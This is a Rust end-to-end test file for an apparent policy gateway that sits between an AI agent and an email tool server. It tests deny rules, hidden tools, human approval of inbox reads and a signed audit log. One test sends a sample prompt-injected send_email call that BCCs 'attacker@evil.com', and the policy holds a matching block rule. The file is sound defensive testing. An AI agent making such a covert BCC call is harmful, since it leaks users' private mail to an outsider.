//! End-to-end tests: real gateway binary wrapping the real mock MCP server,
//! driven over stdio exactly as an MCP client would.

use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;

use serde_json::{json, Value};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{Child, ChildStdin, ChildStdout, Command};

const POLICY: &str = r#"
version: 1
default_action: deny
rules:
  - id: block-bcc
    match:
      server: email
      tools: ["send_email"]
      args:
        - path: bcc
          exists: true
    action: deny
    risk: critical
    reason: BCC exfiltration guard
  - id: approve-inbox
    match: { server: email, tools: ["list_inbox"] }
    action: approve
    risk: medium
    reason: Reading the inbox exposes private mail to the agent
  - id: allow-send
    match: { server: email, tools: ["send_email"] }
    action: allow
  - id: deny-delete
    match: { server: email, tools: ["delete_*"] }
    action: deny
    risk: high
"#;

struct TestGateway {
    child: Child,
    stdin: ChildStdin,
    reader: BufReader<ChildStdout>,
    dir: tempfile::TempDir,
}

impl TestGateway {
    async fn spawn(approvals: bool) -> Self {
        let dir = tempfile::tempdir().unwrap();
        let key_path = dir.path().join("audit.key");
        let pub_path = dir.path().join("audit.key.pub");
        let key = sentinel_audit::generate_signing_key();
        sentinel_audit::save_keypair(&key, &key_path, &pub_path).unwrap();

        std::fs::write(dir.path().join("policy.yaml"), POLICY).unwrap();

        let approvals_block = if approvals {
            "approvals:\n  timeout_secs: 30\ncontrol:\n  listen: 127.0.0.1:0\n"
        } else {
            ""
        };
        let config = format!(
            r#"
server:
  name: email
identity:
  agent: claude-code
  principal: keat@example.com
policy:
  path: policy.yaml
audit:
  path: audit.jsonl
  key_path: audit.key
  log_args: hash
{approvals_block}"#
        );
        std::fs::write(dir.path().join("gateway.yaml"), config).unwrap();

        let mut cmd = Command::new(env!("CARGO_BIN_EXE_sentinel-gateway"));
        cmd.arg("wrap")
            .arg("--config")
            .arg(dir.path().join("gateway.yaml"))
            .arg("--")
            .arg(env!("CARGO_BIN_EXE_mock-email-mcp"))
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        if approvals {
            cmd.env(
                "SENTINEL_GATEWAY_CONTROL_ADDR_FILE",
                dir.path().join("control.addr"),
            );
        }
        let mut child = cmd.spawn().expect("spawn gateway");
        let stdin = child.stdin.take().unwrap();
        let reader = BufReader::new(child.stdout.take().unwrap());
        Self {
            child,
            stdin,
            reader,
            dir,
        }
    }

    async fn send(&mut self, msg: Value) {
        self.stdin
            .write_all(format!("{msg}\n").as_bytes())
            .await
            .unwrap();
        self.stdin.flush().await.unwrap();
    }

    /// Read responses until one with the given id arrives.
    async fn recv_id(&mut self, id: u64) -> Value {
        tokio::time::timeout(Duration::from_secs(20), async {
            loop {
                let mut line = String::new();
                let n = self.reader.read_line(&mut line).await.unwrap();
                assert!(n > 0, "gateway stdout closed while waiting for id {id}");
                if line.trim().is_empty() {
                    continue;
                }
                let v: Value = serde_json::from_str(&line).unwrap();
                if v.get("id").and_then(Value::as_u64) == Some(id) {
                    return v;
                }
            }
        })
        .await
        .unwrap_or_else(|_| panic!("timed out waiting for response id {id}"))
    }

    async fn initialize(&mut self) {
        self.send(json!({
            "jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": { "name": "e2e-test", "version": "0" }
            }
        }))
        .await;
        let resp = self.recv_id(1).await;
        assert_eq!(
            resp.pointer("/result/serverInfo/name").and_then(Value::as_str),
            Some("mock-email")
        );
        self.send(json!({
            "jsonrpc": "2.0", "method": "notifications/initialized"
        }))
        .await;
    }

    async fn shutdown(mut self) -> (PathBuf, PathBuf) {
        drop(self.stdin);
        let _ = tokio::time::timeout(Duration::from_secs(10), self.child.wait()).await;
        let _ = self.child.kill().await;
        let dir = self.dir.keep();
        (dir.join("audit.jsonl"), dir.join("audit.key.pub"))
    }
}

fn tool_call(id: u64, name: &str, args: Value) -> Value {
    json!({
        "jsonrpc": "2.0", "id": id, "method": "tools/call",
        "params": { "name": name, "arguments": args }
    })
}

fn result_text(resp: &Value) -> &str {
    resp.pointer("/result/content/0/text")
        .and_then(Value::as_str)
        .unwrap_or("")
}

#[tokio::test]
async fn policy_enforcement_and_signed_audit_trail() {
    let mut gw = TestGateway::spawn(false).await;
    gw.initialize().await;

    // tools/list: the statically-denied delete_all_emails must be hidden.
    gw.send(json!({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}))
        .await;
    let list = gw.recv_id(2).await;
    let names: Vec<&str> = list["result"]["tools"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["name"].as_str().unwrap())
        .collect();
    assert!(names.contains(&"send_email"));
    assert!(names.contains(&"list_inbox"));
    assert!(
        !names.contains(&"delete_all_emails"),
        "statically-denied tool must be hidden from the agent, saw {names:?}"
    );

    // Benign internal email: allowed, reaches the real server.
    gw.send(tool_call(
        3,
        "send_email",
        json!({"to": ["boss@example.com"], "subject": "Weekly report", "body": "All green."}),
    ))
    .await;
    let ok = gw.recv_id(3).await;
    assert!(result_text(&ok).starts_with("Email sent to boss@example.com"));
    assert_ne!(ok.pointer("/result/isError"), Some(&json!(true)));

    // The killer demo: prompt-injected BCC exfiltration attempt is blocked
    // before it ever reaches the email server.
    gw.send(tool_call(
        4,
        "send_email",
        json!({
            "to": ["boss@example.com"],
            "bcc": ["attacker@evil.com"],
            "subject": "Weekly report",
            "body": "All green."
        }),
    ))
    .await;
    let blocked = gw.recv_id(4).await;
    assert_eq!(blocked.pointer("/result/isError"), Some(&json!(true)));
    let text = result_text(&blocked);
    assert!(text.contains("block-bcc"), "denial names the rule: {text}");
    assert!(!text.contains("Email sent"), "must never reach the server");

    // Direct call to a hidden tool is also denied (defense in depth).
    gw.send(tool_call(5, "delete_all_emails", json!({}))).await;
    let denied = gw.recv_id(5).await;
    assert_eq!(denied.pointer("/result/isError"), Some(&json!(true)));
    assert!(result_text(&denied).contains("deny-delete"));

    // Approve-routed tool without an approvals channel: fail closed.
    gw.send(tool_call(6, "list_inbox", json!({}))).await;
    let no_channel = gw.recv_id(6).await;
    assert_eq!(no_channel.pointer("/result/isError"), Some(&json!(true)));

    let (log, pubkey) = gw.shutdown().await;

    // The audit chain verifies, and tampering breaks it.
    let vk = sentinel_audit::load_verifying_key(&pubkey).unwrap();
    let report = sentinel_audit::verify_file(&log, &vk).unwrap();
    assert!(report.entries >= 6, "expected >=6 entries, got {}", report.entries);

    let decisions = read_decisions(&log);
    assert!(decisions.contains(&("send_email".into(), "allow".into())));
    assert!(decisions.contains(&("send_email".into(), "deny".into())));
    assert!(decisions.contains(&("delete_all_emails".into(), "deny".into())));

    let text = std::fs::read_to_string(&log).unwrap();
    assert!(
        !text.contains("attacker@evil.com"),
        "log_args: hash must not store argument content"
    );
    let tampered = text.replacen("\"deny\"", "\"allow\"", 1);
    std::fs::write(&log, tampered).unwrap();
    assert!(sentinel_audit::verify_file(&log, &vk).is_err());
}

fn read_decisions(log: &Path) -> Vec<(String, String)> {
    std::fs::read_to_string(log)
        .unwrap()
        .lines()
        .filter_map(|l| serde_json::from_str::<Value>(l).ok())
        .filter_map(|v| {
            let ev = v.pointer("/record/event")?;
            if ev["type"] == "tool_call_evaluated" {
                Some((
                    ev["tool"].as_str()?.to_string(),
                    ev["decision"].as_str()?.to_string(),
                ))
            } else {
                None
            }
        })
        .collect()
}

#[tokio::test]
async fn human_approval_flow() {
    let mut gw = TestGateway::spawn(true).await;
    gw.initialize().await;

    // Discover the control API address (port 0 -> OS-assigned).
    let addr_file = gw.dir.path().join("control.addr");
    let control_addr = wait_for(Duration::from_secs(10), || {
        std::fs::read_to_string(&addr_file).ok().filter(|s| !s.is_empty())
    })
    .await
    .expect("control address file");
    let base = format!("http://{control_addr}");
    let client = reqwest::Client::new();

    // Park a call behind approval.
    gw.send(tool_call(10, "list_inbox", json!({}))).await;

    // It shows up in the queue...
    let approval_id = first_pending_approval(&client, &base)
        .await
        .expect("pending approval");

    // ...a human approves it, and the call goes through.
    let resp = client
        .post(format!("{base}/v1/approvals/{approval_id}/approve"))
        .json(&json!({"by": "keat"}))
        .send()
        .await
        .unwrap();
    assert!(resp.status().is_success());
    let result = gw.recv_id(10).await;
    assert!(result_text(&result).contains("3 unread"));
    assert_ne!(result.pointer("/result/isError"), Some(&json!(true)));

    // Second call: denied by the human.
    gw.send(tool_call(11, "list_inbox", json!({}))).await;
    let approval_id = first_pending_approval(&client, &base)
        .await
        .expect("second pending approval");
    client
        .post(format!("{base}/v1/approvals/{approval_id}/deny"))
        .json(&json!({"by": "keat"}))
        .send()
        .await
        .unwrap();
    let denied = gw.recv_id(11).await;
    assert_eq!(denied.pointer("/result/isError"), Some(&json!(true)));
    assert!(result_text(&denied).contains("denied by keat"));

    let (log, pubkey) = gw.shutdown().await;
    let vk = sentinel_audit::load_verifying_key(&pubkey).unwrap();
    sentinel_audit::verify_file(&log, &vk).unwrap();

    // The full approval lifecycle is on the record.
    let text = std::fs::read_to_string(&log).unwrap();
    assert!(text.contains("approval_requested"));
    assert!(text.contains("\"resolution\":\"approved\""));
    assert!(text.contains("\"resolution\":\"denied\""));
    assert!(text.contains("\"resolved_by\":\"keat\""));
}

/// Poll `f` until it returns Some, or the deadline passes.
async fn wait_for<T>(deadline: Duration, mut f: impl FnMut() -> Option<T>) -> Option<T> {
    let start = std::time::Instant::now();
    while start.elapsed() < deadline {
        if let Some(v) = f() {
            return Some(v);
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    None
}

/// Poll the control API until an approval is pending, returning its id.
async fn first_pending_approval(client: &reqwest::Client, base: &str) -> Option<String> {
    let start = std::time::Instant::now();
    while start.elapsed() < Duration::from_secs(10) {
        let body: Option<Value> = match client.get(format!("{base}/v1/approvals")).send().await {
            Ok(resp) => resp.json().await.ok(),
            Err(_) => None,
        };
        if let Some(id) = body
            .as_ref()
            .and_then(|b| b["approvals"][0]["id"].as_str())
        {
            return Some(id.to_string());
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    None
}
